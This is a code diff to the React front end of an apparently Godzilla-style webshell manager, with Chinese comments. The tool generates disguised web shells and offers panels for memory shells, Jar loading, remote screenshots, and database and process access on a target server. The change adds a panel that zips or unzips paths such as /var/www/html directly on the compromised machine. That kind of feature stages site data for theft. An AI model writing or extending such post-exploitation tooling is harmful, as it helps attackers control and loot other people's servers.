@@ -19,7 +19,7 @@ import {
   FolderUpIcon, FilePlusIcon, FolderPlusIcon, PencilLineIcon,
   InfoIcon, FolderIcon, TerminalIcon, DatabaseIcon, NetworkIcon,
   CpuIcon, BugIcon, LayoutGridIcon, PackageIcon, CameraIcon, WrenchIcon,
-  NotebookPenIcon, XIcon, ShieldIcon,
+  NotebookPenIcon, XIcon, ShieldIcon, ArchiveIcon,
 } from "lucide-react";
 
 const SCRIPT_TYPES = ["php", "jsp", "jspx", "asp", "aspx", "py", "node"];
@@ -31,8 +31,8 @@ const DISGUISES = [{ v: "", label: "伪装链：自动" }, { v: "png", label: "�
 const isJavaCarrier = (t?: { carrier?: string }) => t?.carrier === "java";
 
 function extOps(st: string): string[] {
-  if (st === "php") return ["db", "net", "proc", "phptool"];
-  if (st === "jsp" || st === "jspx") return ["db", "net", "memshell", "servlet", "jar", "shot"];
+  if (st === "php") return ["db", "net", "proc", "phptool", "zip"];
+  if (st === "jsp" || st === "jspx") return ["db", "net", "memshell", "servlet", "jar", "shot", "zip"];
   return [];
 }
 
@@ -346,14 +346,14 @@ function GenerateDialog({ onClose }: { onClose: () => void }) {
 
 // ==================== 会话窗口（哥斯拉式：深色伪窗口 + 功能按钮条） ====================
 
-type PanelKey = "info" | "files" | "cmd" | "db" | "net" | "proc" | "memshell" | "servlet" | "jar" | "shot" | "phptool" | "note";
+type PanelKey = "info" | "files" | "cmd" | "db" | "net" | "proc" | "memshell" | "servlet" | "jar" | "shot" | "zip" | "phptool" | "note";
 
 function SessionWindow({ target, onClose }: { target: WSTarget; onClose: () => void }) {
   // Java 载体支持 exec/info/文件管理；数据库、网络、进程、内存马、Servlet 枚举、
-  // Jar 加载、远程屏幕这几项在载荷里用 JDK 自带 API 重写过等价实现（不依赖目标端
-  // 解释器），所以也能开。仍属脚本载体专属的：zip/unzip、PHP 工具。
+  // Jar 加载、远程屏幕、压缩/解压这几项在载荷里用 JDK 自带 API 重写过等价实现
+  // （不依赖目标端解释器），所以也能开。仍属脚本载体专属的：PHP 工具。
   const javaCarrier = isJavaCarrier(target);
-  const ops = javaCarrier ? ["db", "net", "proc", "memshell", "servlet", "jar", "shot"] : extOps(target.script_type);
+  const ops = javaCarrier ? ["db", "net", "proc", "memshell", "servlet", "jar", "shot", "zip"] : extOps(target.script_type);
   const panels: { key: PanelKey; label: string; icon: React.ReactNode }[] = [
     { key: "info", label: "基础信息", icon: <InfoIcon className="size-4" /> },
     { key: "files", label: "文件管理", icon: <FolderIcon className="size-4" /> },
@@ -365,6 +365,7 @@ function SessionWindow({ target, onClose }: { target: WSTarget; onClose: () => v
     ...(ops.includes("servlet") ? [{ key: "servlet" as PanelKey, label: "Servlet", icon: <LayoutGridIcon className="size-4" /> }] : []),
     ...(ops.includes("jar") ? [{ key: "jar" as PanelKey, label: "Jar加载", icon: <PackageIcon className="size-4" /> }] : []),
     ...(ops.includes("shot") ? [{ key: "shot" as PanelKey, label: "远程屏幕", icon: <CameraIcon className="size-4" /> }] : []),
+    ...(ops.includes("zip") ? [{ key: "zip" as PanelKey, label: "压缩解压", icon: <ArchiveIcon className="size-4" /> }] : []),
     ...(ops.includes("phptool") ? [{ key: "phptool" as PanelKey, label: "PHP工具", icon: <WrenchIcon className="size-4" /> }] : []),
     { key: "note", label: "笔记", icon: <NotebookPenIcon className="size-4" /> },
   ];
@@ -409,6 +410,7 @@ function SessionWindow({ target, onClose }: { target: WSTarget; onClose: () => v
           {panel === "servlet" && <ServletPanel target={target} />}
           {panel === "jar" && <JarPanel target={target} />}
           {panel === "shot" && <ShotPanel target={target} />}
+          {panel === "zip" && <ZipPanel target={target} />}
           {panel === "phptool" && <PHPToolPanel target={target} />}
           {panel === "note" && <NotePanel target={target} />}
         </div>
@@ -1015,6 +1017,74 @@ function ShotPanel({ target }: { target: WSTarget }) {
           <a href={img} download="screenshot.png" className="text-xs text-blue-400 hover:underline">下载 PNG</a>
         </div>
       )}
+    </div>
+  );
+}
+
+// ---------- 压缩 / 解压 ----------
+
+/**
+ * 目标路径留空时按惯例推导，省得每次手打：
+ *   打包 /var/www/html → /var/www/html.zip
+ *   解包 /tmp/site.zip → /tmp/site（没有压缩后缀就给 <名>_out，避免解到原包路径上）
+ */
+function deriveDst(op: "zip" | "unzip", src: string): string {
+  const clean = src.replace(/[\\/]+$/, "");
+  if (!clean) return "";
+  if (op === "zip") return clean + ".zip";
+  const stripped = clean.replace(/\.(zip|jar|war|tar|gz|tgz|7z)$/i, "");
+  return stripped !== clean ? stripped : clean + "_out";
+}
+
+function ZipPanel({ target }: { target: WSTarget }) {
+  const [src, setSrc] = React.useState("");
+  const [dst, setDst] = React.useState("");
+  const [out, setOut] = React.useState("");
+  const [lastOp, setLastOp] = React.useState<"zip" | "unzip" | "">("");
+  const { busy, ext } = useRunner(target);
+
+  const run = async (op: "zip" | "unzip") => {
+    const s = src.trim();
+    if (!s) {
+      setOut("[提示] 先填源路径：打包填目标机上的文件或目录，解包填压缩包路径");
+      return;
+    }
+    const d = dst.trim() || deriveDst(op, s);
+    if (!dst.trim()) setDst(d);
+    setLastOp(op);
+    const r = await ext(op, { src_path: s, dst_path: d });
+    setOut(r.ok ? r.output : "[失败] " + r.error);
+  };
+
+  return (
+    <div className="space-y-2 text-sm">
+      <div className="text-xs text-zinc-500">
+        在目标机上打包 / 解包（不进本地中转）。目录会递归，空目录也会保留；
+        解包时越界的条目（../ 或绝对路径）会被丢弃，不会写到目标目录外面。
+        路径可以从「文件管理」面板复制过来。
+      </div>
+      <div className="grid gap-2 md:grid-cols-2">
+        <label className="space-y-1">
+          <span className="text-[11px] text-zinc-400">源路径</span>
+          <DInput value={src} onChange={(e) => setSrc(e.target.value)} placeholder="/var/www/html 或 /tmp/site.zip" className="w-full" />
+        </label>
+        <label className="space-y-1">
+          <span className="text-[11px] text-zinc-400">目标路径（留空自动推导）</span>
+          <DInput value={dst} onChange={(e) => setDst(e.target.value)} placeholder={src ? deriveDst("zip", src) : "/tmp/site.zip 或 /tmp/out"} className="w-full" />
+        </label>
+      </div>
+      <div className="flex flex-wrap gap-1">
+        <DBtn onClick={() => run("zip")} disabled={busy}>
+          <ArchiveIcon className={`size-3.5 ${busy && lastOp === "zip" ? "animate-pulse" : ""}`} /> 打包
+        </DBtn>
+        <DBtn onClick={() => run("unzip")} disabled={busy}>
+          <FolderUpIcon className={`size-3.5 ${busy && lastOp === "unzip" ? "animate-pulse" : ""}`} /> 解包
+        </DBtn>
+        <DBtn onClick={() => { setDst(src ? deriveDst("zip", src) : ""); }} disabled={busy || !src}>
+          推导目标
+        </DBtn>
+      </div>
+      <DPre>{out || "（结果：打包回 OK <字节数>，解包回 OK <条目数>，跳过的异常条目会附在尾部）"}</DPre>
     </div>
   );
 }
